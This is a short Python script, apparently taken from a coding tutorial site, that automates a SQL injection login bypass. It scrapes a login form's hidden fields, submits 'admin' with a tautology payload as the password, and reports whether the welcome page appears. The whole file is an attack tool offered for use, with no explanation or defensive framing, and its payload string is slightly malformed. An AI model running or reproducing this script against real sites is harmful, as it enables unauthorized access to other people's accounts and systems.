# Reference: https://www.codewithc.com/
# Date: N/A

import requests
from bs4 import BeautifulSoup

TARGET_URL = 'http://example.com/login'
HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}

def get_hidden_form_fields(response_text):
    soup = BeautifulSoup(response_text, 'html.parser')
    form = soup.find('form')
    hidden_inputs = form.find_all('input', type='hidden')
    form_data = {input['name']: input['value'] for input in hidden_inputs}
    return form_data

def func(username):
    with requests.Session() as session:
        response = session.get(TARGET_URL, headers=HEADERS)
        form_data = get_hidden_form_fields(response.text)
        sql_payload = "'' OR '1'='1'"
        form_data.update({
            'username': username,
            'password': sql_payload
        })
        response = session.post(TARGET_URL, data=form_data, headers=HEADERS)
        if 'Welcome, ' + username in response.text:
            return True
        else:
            return False

is_authenticated = func('admin')
print(f'Authentication Successful: {is_authenticated}')